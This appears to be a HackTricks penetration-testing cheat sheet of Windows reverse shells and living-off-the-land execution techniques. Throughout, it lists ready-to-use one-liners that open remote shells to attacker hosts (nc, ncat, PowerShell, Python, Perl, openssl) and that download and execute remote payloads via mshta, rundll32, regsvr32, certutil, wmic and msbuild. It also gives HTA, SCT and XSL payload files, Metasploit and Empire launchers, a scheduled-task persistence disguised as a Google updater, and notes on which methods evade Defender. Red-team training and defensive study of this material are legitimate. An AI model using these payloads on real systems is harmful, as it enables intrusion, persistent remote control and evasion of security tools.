# Shells - Windows

{{#include ../../banners/hacktricks-training.md}}

## Lolbas

The page [lolbas-project.github.io](https://lolbas-project.github.io/) is for Windows, just as [https://gtfobins.github.io/](https://gtfobins.github.io/) is for Linux.<sup>[[13]](#references)[[14]](#references)</sup>
Windows uses access tokens and privileges for process security, and Windows 11 also includes an optional `sudo` command.<sup>[[11]](#references)[[12]](#references)</sup> It is useful to know **how** some **binaries** can be (ab)used to perform unexpected actions such as **executing arbitrary code**.<sup>[[13]](#references)</sup>

The baseline Windows reverse-shell payloads collected below are also documented in the HighOn.Coffee and PayloadsAllTheThings cheat sheets; adjust paths and installed interpreters for the target.<sup>[[1]](#references)[[4]](#references)</sup>

## NC

```bash
nc.exe -e cmd.exe <Attacker_IP> <PORT>
```

## NCAT

victim

```
ncat.exe <Attacker_IP> <PORT>  -e "cmd.exe /c (cmd.exe  2>&1)"
#Encryption to bypass firewall
ncat.exe <Attacker_IP> <PORT eg.443> --ssl -e "cmd.exe /c (cmd.exe  2>&1)"
```

attacker

```
ncat -l <PORT>
#Encryption to bypass firewall
ncat -l <PORT eg.443> --ssl
```

## SBD

**[sbd](https://www.kali.org/tools/sbd/) is a portable and secure Netcat alternative**. It works on Unix-like systems and Win32. With features like strong encryption, program execution, customizable source ports, and continuous reconnection, sbd provides a versatile solution for TCP/IP communication. For Windows users, the sbd.exe version from the Kali Linux distribution can be used as a reliable replacement for Netcat.<sup>[[15]](#references)</sup>

```bash
# Victims machine
sbd -l -p 4444 -e bash -v -n
listening on port 4444


# Atackers
sbd 10.10.10.10 4444
id
uid=0(root) gid=0(root) groups=0(root)
```

## Python

```bash
#Windows
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```

## Perl

```bash
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

## Ruby

```bash
#Windows
ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

## Lua

```bash
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```

## OpenSSH

Attacker (Kali)

```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```

Victim

```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```

## Powershell

```bash
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
```

Process performing network call: **powershell.exe**\
Payload written on disk: **NO** (_at least nowhere I could find using procmon !_).<sup>[[5]](#references)</sup>

```bash
powershell -exec bypass -f \\webdavserver\folder\payload.ps1
```

Process performing network call: **svchost.exe**\
Payload written on disk: **WebDAV client local cache**.<sup>[[5]](#references)</sup>

**One liner:**

```bash
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

**Get more info about different Powershell Shells at the end of this document**

## Mshta

- [From here](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/).<sup>[[5]](#references)</sup>

```bash
mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
```

```bash
mshta http://webserver/payload.hta
```

```bash
mshta \\webdavserver\folder\payload.hta
```

#### **Example of hta-psh reverse shell (use hta to download and execute PS backdoor)**

```xml
 <scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
```

**You can download & execute very easily a Koadic zombie using the stager hta**.<sup>[[3]](#references)</sup>

#### hta example

[**From here**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f).<sup>[[7]](#references)</sup>

```xml
<html>
<head>
<HTA:APPLICATION ID="HelloExample">
<script language="jscript">
        var c = "cmd.exe /c calc.exe";
        new ActiveXObject('WScript.Shell').Run(c);
</script>
</head>
<body>
<script>self.close();</script>
</body>
</html>
```

#### **mshta - sct**

[**From here**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17).<sup>[[8]](#references)</sup>

```xml
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:C:\local\path\scriptlet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
    var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```

#### **Mshta - Metasploit**

```bash
use exploit/windows/misc/hta_server
msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
msf exploit(windows/misc/hta_server) > set lhost 192.168.1.109
msf exploit(windows/misc/hta_server) > exploit
```

```bash
Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit
```

**Detected by defender**

## **Rundll32**

[**Dll hello world example**](https://github.com/carterjones/hello-world-dll)

- [From here](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/).<sup>[[5]](#references)</sup>

```bash
rundll32 \\webdavserver\folder\payload.dll,entrypoint
```

```bash
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
```

**Detected by defender**

**Rundll32 - sct**

Reuse the scriptlet shown in the [mshta - sct](#mshta-sct) section; its leading comment contains the corresponding `rundll32.exe` launcher.<sup>[[8]](#references)</sup>

#### **Rundll32 - Metasploit**

```bash
use windows/smb/smb_delivery
run
#You will be given the command to run in the victim: rundll32.exe \\10.2.0.5\Iwvc\test.dll,0
```

**Rundll32 - Koadic**

```bash
use stager/js/rundll32_js
set SRVHOST 192.168.1.107
set ENDPOINT sales
run
#Koadic will tell you what you need to execute inside the victim, it will be something like:
rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","http://10.2.0.5:9997/ownmG",false);x.send();eval(x.responseText);window.close();
```

## Regsvr32

- [From here](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/).<sup>[[5]](#references)</sup>

```bash
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
```

```
regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
```

**Detected by defender**

#### Regsvr32 – arbitrary DLL export with /i argument (gatekeeping & persistence)

Besides loading remote scriptlets (`scrobj.dll`), `regsvr32.exe` will load a local DLL and invoke its `DllRegisterServer`/`DllUnregisterServer` exports. Custom loaders frequently abuse this to execute arbitrary code while blending with a signed LOLBin. Two tradecraft notes seen in the wild:<sup>[[6]](#references)</sup>

- Gatekeeping argument: the DLL exits unless a specific switch is passed via `/i:<arg>`, e.g. `/i:--type=renderer` to mimic Chromium renderer children. This reduces accidental execution and frustrates sandboxes.
- Persistence: schedule `regsvr32` to run the DLL with silent + high privileges and the required `/i` argument, masquerading as an updater task:
  ```powershell
  Register-ScheduledTask \
    -Action (New-ScheduledTaskAction -Execute "regsvr32" -Argument "/s /i:--type=renderer \"%APPDATA%\Microsoft\SystemCertificates\<name>.dll\"") \
    -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 1)) \
    -TaskName 'GoogleUpdaterTaskSystem196.6.2928.90.{FD10B0DF-...}' \
    -TaskPath '\\GoogleSystem\\GoogleUpdater' \
    -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit 0 -DontStopOnIdleEnd) \
    -RunLevel Highest
  ```

See also: ClickFix clipboard‑to‑PowerShell variant that stages a JS loader and later persists with `regsvr32`.<sup>[[6]](#references)</sup>
{{#ref}}
../../generic-methodologies-and-resources/phishing-methodology/clipboard-hijacking.md
{{#endref}}


[**From here**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1).<sup>[[9]](#references)</sup>

```html
<?XML version="1.0"?>
<!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
<!-- regsvr32 /u /n /s /i:\\webdavserver\folder\regsvr32.sct scrobj.dll -->
<scriptlet>
<registration
    progid="PoC"
    classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
    <script language="JScript">
        <![CDATA[
            var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
        ]]>
</script>
</registration>
</scriptlet>
```

#### **Regsvr32 - Metasploit**

```bash
use multi/script/web_delivery
set target 3
set payload windows/meterpreter/reverse/tcp
set lhost 10.2.0.5
run
#You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
```

**You can download & execute very easily a Koadic zombie using the stager regsvr**.<sup>[[3]](#references)</sup>

## Certutil

- [From here](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/).<sup>[[5]](#references)</sup>

Download a B64dll, decode it and execute it.<sup>[[5]](#references)</sup>

```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
```

Download a B64exe, decode it and execute it.<sup>[[5]](#references)</sup>

```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
```

**Detected by defender**

## **Cscript/Wscript**

```bash
powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0.5:8000/reverse_shell.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""
```

**Cscript - Metasploit**

```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
```

**Detected by defender**

## PS-Bat

```bash
\\webdavserver\folder\batchfile.bat
```

Process performing network call: **svchost.exe**\
Payload written on disk: **WebDAV client local cache**.<sup>[[5]](#references)</sup>

```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
impacket-smbserver -smb2support kali `pwd`
```

```bash
\\10.8.0.3\kali\shell.bat
```

**Detected by defender**

## **MSIExec**

Attacker

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
python -m SimpleHTTPServer 80
```

Victim:

```
victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
```

**Detected**

## **Wmic**

- [From here](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/).<sup>[[5]](#references)</sup>

```bash
wmic os get /format:"https://webserver/payload.xsl"
```

Example xsl file [from here](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7).<sup>[[10]](#references)</sup>

```xml
<?xml version='1.0'?>
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
<output method="text"/>
    <ms:script implements-prefix="user" language="JScript">
        <![CDATA[
            var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object Net.WebClient).DownloadString('http://10.2.0.5/shell.ps1') | powershell -noprofile -");
        ]]>
    </ms:script>
</stylesheet>
```

**Not detected**

**You can download & execute very easily a Koadic zombie using the stager wmic**.<sup>[[3]](#references)</sup>

## Msbuild

- [From here](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/).<sup>[[5]](#references)</sup>

```
cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
```

This project documents MSBuildShell as a PowerShell host that can bypass application whitelisting and `powershell.exe` restrictions and provide a PowerShell-like shell.<sup>[[16]](#references)</sup>\
Just download this and execute it: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj).<sup>[[16]](#references)</sup>

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
```

**Not detected**

## **CSC**

Compile C# code in the victim machine.<sup>[[17]](#references)[[18]](#references)</sup>

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
```

You can download a basic C# reverse shell from here: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)

**Not deteted**

## **Regasm/Regsvc**

- [From here](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/).<sup>[[5]](#references)</sup>

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
```

**I haven't tried it**

[**https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182**](https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182).<sup>[[2]](#references)</sup>

## Odbcconf

- [From here](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/).<sup>[[5]](#references)</sup>

```bash
odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
```

**I haven't tried it**

[**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2).<sup>[[2]](#references)</sup>

## Powershell Shells

### PS-Nishang

[https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)

In the **Shells** folder, there are a lot of different shells. To download and execute Invoke-_PowerShellTcp.ps1_ make a copy of the script and append to the end of the file:<sup>[[19]](#references)</sup>

```
Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
```

Start serving the script in a web server and execute it on the victim's end:<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>

```
powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
```

Defender doesn't detect it as malicious code (yet, 3/04/2019).

**TODO: Check other nishang shells**

### **PS-Powercat**

[**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)

Download, start a web server, start the listener, and execute it on the victim's end:<sup>[[22]](#references)</sup>

```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```

Defender doesn't detect it as malicious code (yet, 3/04/2019).

**Other options offered by powercat:**

Bind shells, Reverse shell (TCP, UDP, DNS), Port redirect, upload/download, Generate payloads, Serve files...<sup>[[22]](#references)</sup>

```
Serve a cmd Shell:
    powercat -l -p 443 -e cmd
Send a cmd Shell:
    powercat -c 10.1.1.1 -p 443 -e cmd
Send a powershell:
    powercat -c 10.1.1.1 -p 443 -ep
Send a powershell UDP:
    powercat -c 10.1.1.1 -p 443 -ep -u
TCP Listener to TCP Client Relay:
    powercat -l -p 8000 -r tcp:10.1.1.16:443
Generate a reverse tcp payload which connects back to 10.1.1.15 port 443:
    powercat -c 10.1.1.15 -p 443 -e cmd -g
Start A Persistent Server That Serves a File:
    powercat -l -p 443 -i C:\inputfile -rep
```

### Empire

[https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)

Create a powershell launcher, save it in a file and download and execute it.<sup>[[23]](#references)[[26]](#references)[[27]](#references)</sup>

```
powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```

**Detected as malicious code**

### MSF-Unicorn

[https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)

Create a powershell version of metasploit backdoor using unicorn.<sup>[[24]](#references)</sup>

```
python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
```

Start msfconsole with the created resource:<sup>[[24]](#references)</sup>

```
msfconsole -r unicorn.rc
```

Start a web server serving the _powershell_attack.txt_ file and execute in the victim:<sup>[[24]](#references)</sup>

```
powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
```

**Detected as malicious code**

## More

[PS>Attack](https://github.com/jaredhaight/PSAttack) PS console with some offensive PS modules preloaded (cyphered)\
[https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
WinPWN](https://github.com/SecureThisShit/WinPwn) PS console with some offensive PS modules and proxy detection (IEX).<sup>[[25]](#references)</sup>

## References

- [1] [Reverse Shell Cheat Sheet: PHP, ASP, Netcat, Bash & Python](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
- [2] [Arno0x's GitHub Gists](https://gist.github.com/Arno0x)
- [3] [Koadic – COM Command & Control Framework](https://www.hackingarticles.in/koadic-com-command-control-framework/)
- [4] [Reverse Shell Cheatsheet - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [5] [Windows Oneliners to Download Remote Payload and Execute Arbitrary Code](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
- [6] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [7] [calc.hta – HTA reverse execution example (Arno0x gist)](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
- [8] [scriptlet.sct – mshta/rundll32 scriptlet example (Arno0x gist)](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
- [9] [regsvr32.sct – Regsvr32 scriptlet example (Arno0x gist)](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
- [10] [wmic.xsl – WMIC XSL stylesheet example (Arno0x gist)](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7)
- [11] [Access Tokens – Win32 apps (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
- [12] [Sudo for Windows (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/advanced-settings/sudo/)
- [13] [LOLBAS](https://lolbas-project.github.io/)
- [14] [GTFOBins](https://gtfobins.github.io/)
- [15] [sbd | Kali Linux Tools](https://www.kali.org/tools/sbd/)
- [16] [MSBuildShell](https://github.com/Cn33liz/MSBuildShell)
- [17] [Compiler Options – language feature rules (Microsoft Learn)](https://learn.microsoft.com/en-us/dotnet/csharp/language-reference/compiler-options/language)
- [18] [Compiler Options – output options (Microsoft Learn)](https://learn.microsoft.com/en-us/dotnet/csharp/language-reference/compiler-options/output)
- [19] [Nishang](https://github.com/samratashok/nishang)
- [20] [Invoke-WebRequest (Microsoft Learn)](https://learn.microsoft.com/en-us/powershell/module/Microsoft.PowerShell.Utility/Invoke-WebRequest?view=powershell-5.1)
- [21] [Invoke-Expression (Microsoft Learn)](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.5)
- [22] [powercat](https://github.com/besimorhino/powercat)
- [23] [Empire (archived repository)](https://github.com/EmpireProject/Empire)
- [24] [Unicorn](https://github.com/trustedsec/unicorn)
- [25] [WinPwn](https://github.com/SecureThisShit/WinPwn)
- [26] [Empire Wiki](https://bc-security.gitbook.io/empire-wiki/)
- [27] [multi_generate_agent | Empire Wiki](https://bc-security.gitbook.io/empire-wiki/stagers/multi_generate_agent)

{{#include ../../banners/hacktricks-training.md}}
